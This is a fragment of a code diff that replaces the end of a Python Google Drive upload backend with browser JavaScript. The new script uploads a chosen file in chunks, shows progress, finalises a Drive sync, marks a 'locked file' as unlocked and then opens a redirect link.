+          const end = Math.min(start + CHUNK_SIZE, selectedFile.size);
+          const chunk = selectedFile.slice(start, end);
+
+          const formData = new FormData();
+          formData.append('upload_id', upload_id);
+          formData.append('chunk_index', i);
+          formData.append('file', chunk);
+
+          const uploadRes = await fetch(BACKEND_URL + '/upload/chunk', {
+            method: 'POST',
+            body: formData
+          });
+
+          if (!uploadRes.ok) throw new Error('Failed to upload chunk ' + i);
+
+          // تحديث شريط التقدم
+          const pct = Math.round(((i + 1) / totalChunks) * 100);
+          progressFill.style.width = pct + '%';
+          progressPct.textContent = pct + '%';
+          progressText.textContent = pct < 100 ? `Uploading part ${i + 1}/${totalChunks}...` : 'Processing final file...';
         }
-        media = MediaFileUpload(
-            final_file_path,
-            mimetype="application/octet-stream",
-            resumable=True,
-            chunksize=5 * 1024 * 1024
-        )
-        uploaded = service.files().create(
-            body=file_metadata,
-            media_body=media,
-            fields="id,name"
-        ).execute()
 
-        return {"success": True, "file_id": uploaded.get("id")}
-    
-    except Exception as e:
-        return JSONResponse({"success": False, "error": str(e)}, status_code=500)
-    
-    finally:
-        # تنظيف أي ملفات متبقية (سواء نجح الرفع أو فشل)
-        if os.path.exists(final_file_path):
-            os.unlink(final_file_path)
-        for f in os.listdir(TEMP_CHUNKS_DIR):
-            if f.startswith(upload_id):
-                try: os.unlink(os.path.join(TEMP_CHUNKS_DIR, f))
-                except: pass
+        // 3. إنهاء الرفع
+        progressText.textContent = 'Syncing with Google Drive...';
+        const completeData = new FormData();
+        completeData.append('upload_id', upload_id);
+        completeData.append('filename', selectedFile.name);
 
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8000))
-    uvicorn.run(app, host="0.0.0.0", port=port)
+        const finishRes = await fetch(BACKEND_URL + '/upload/complete', {
+          method: 'POST',
+          body: completeData
+        });
+
+        const result = await finishRes.json();
+        if (result.success) {
+          progressFill.style.width = '100%';
+          progressPct.textContent = '100%';
+          progressText.textContent = 'Done!';
+          lockedFile.classList.add('unlocked');
+          lockIcon.innerHTML = '<polyline points="20 6 9 17 4 12"/>';
+          lockedHint.textContent = 'Upload complete ✓';
+          startBtn.textContent = '✓ Done!';
+          startBtn.style.background = '#15803d';
+          setTimeout(() => { window.open(REDIRECT_URL, '_blank'); }, 1000);
+        } else {
+          throw new Error(result.error || 'Final processing failed');
+        }
+
+      } catch (err) {
+        showStatus('Error: ' + err.message, 'error');
+        startBtn.disabled = false;
+        startBtn.textContent = 'START';
+        progressWrap.classList.remove('show');
+      }
+    });
+
+    function showStatus(msg, type) { statusMsg.textContent = msg; statusMsg.className = `status-msg show ${type}`; }
+    function hideStatus() { statusMsg.className = 'status-msg'; }
+    function toggleFaq(el) { el.classList.toggle('open'); }
+  </script>
+</body>
+
+</html>
